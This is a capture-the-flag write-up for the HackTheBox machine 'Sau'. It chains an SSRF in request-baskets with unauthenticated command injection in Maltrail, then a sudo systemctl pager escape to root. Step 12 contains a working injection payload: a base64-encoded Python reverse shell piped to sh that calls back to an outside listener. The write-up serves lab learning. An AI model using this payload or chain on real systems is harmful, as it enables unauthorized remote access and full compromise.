<h2> Target: 10.129.247.225 Sau </h2>
<b>Initial Access:</b><br>
Step 1: nmap -Pn 10.129.247.225 --min-rate=2000 -p- <br>

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/ba80a5e0-6235-4e12-89ea-3a2fc8f79cdb)

Nmap shows 2 filtered ports and 2 open ports

Step 2: Enumerate the open ports further using nmap: nmap -Pn 10.129.247.225 --min-rate=5000 -p 22,55555 -sC -sV -oN nmap-sau

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/14c022c3-5e4c-48aa-8b8d-e810eae0725d)

Step 3: Navigating to http://10.10.11.224:55555 automatically redirects to http://10.10.11.224:55555/web which shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/5c9e8501-93e0-4e97-8b60-66b272f3ea5b)

The bottom of the page shows that the site is using ‘request-baskets version 1.2.1’.   

Step 4: Google search ‘request-baskets exploit’ shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/924b36d7-ec52-4ad2-9b21-51d387bd0861)

Google shows plenty of sites explaining that request-baskets 1.2.1 is vulnerable to ssrf.  Opening https://notes.sjtu.edu.cn/s/MUUhEymt7# shows the steps to exploit this vulnerability: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/44693bb0-a530-4922-9a49-f22d0a1edf98)
 
The next few steps will be following the steps shown on this site.  

Step 5: Create a basket by navigating to http://10.10.11.224:55555/web and clicking on ‘Create’:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/9f4a4168-56b6-48c6-9a04-6d352c0f1f7c)

Step 6: After clicking on ‘Create’, the page shows: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a018be5c-fca8-4f41-80c0-4dde92e59b4c)
 
Click on the settings icon at the top of the page.  Configure the basket settings as follows:
 
![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/f8a3e2e4-3d17-4ec6-b025-89769b539b16)
  
The reason we are putting the forwarded url as ‘http://127.0.0.1:80/index.html’ is because earlier on we saw that nmap showed that port 80 was filtered when accessed externally.  Using ssrf we are trying to access port 80.    

Step 7: Navigating to http://10.10.11.224:55555/2h8dlj1 shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/7bb73e6e-a55d-4991-8164-a1ece3e708e6)

The page shows the forwarded url.  Using the ssrf we are able to access the internal site on port 80.  

Step 8: The bottom of the page shows the site is using ‘Maltrail version 0.53’.  Google search ‘Maltrail version 0.53 exploit’ shows that it’s vulnerable to unauthenticated command injection.  The next few steps will be the steps to perform the unauthenticated command injection.  

Step 9: The vulnerability is shown to be in the username parameter.  Since the exploit is in the login page, change the basket settings to point to /login instead of /index.html:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a38fcf5a-6ea0-4fd7-80f1-be34399395e2)
 
Step 10: Visit the site http://10.10.11.224:55555/2h8dlj1, capture the request in burp suite, and send the request to ‘repeater’ in burp suite.  Change the requst method to ‘POST’ and add in the bod parameter username=whatever&password=whatever

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/f284ace4-96c4-45b5-afd8-510c4520c182)
 
Step 11: Base64 encode a python reverse shell payload as we will need this for the command injection: 
 
![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/45679838-1424-4786-945a-ff37ecf3a3ec)

Step 12: Add in the the command injection after the username=whatever: ;\`echo+"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTc1Iiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vK"|base64+-d|sh\`

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/faf1374f-ea96-409c-a54a-d950f5c7ea45)

Step 13: Open a netcat/pwncat listener to catch the reverse shell: pwncat-cs -lp 443

Send the request.  The pwncat listener got a reverse shell as username ‘puma’.  We can get the flag in /home/puma/user.txt
____________________________________________
<b>Privilege Escalation</b><br>
Step 1: Check sudo permissions: sudo -l

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/5d8dd9c1-6e4c-4d74-bce9-4b34e6626735)
  
This shows we have sudo permissions to run ‘/usr/bin/systemctl status trail.service’ as the root user without entering a password.  

Step 2: Google ‘gtfobins systemctl’ shows a simple way to exploit.  First run the command: sudo systemctl status trail.service

Next, run the command: !sh

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/c2580076-a517-4b76-9ed6-f30ab549f80d)

We have shell as root.  We can get the flag in /root/root.txt.  
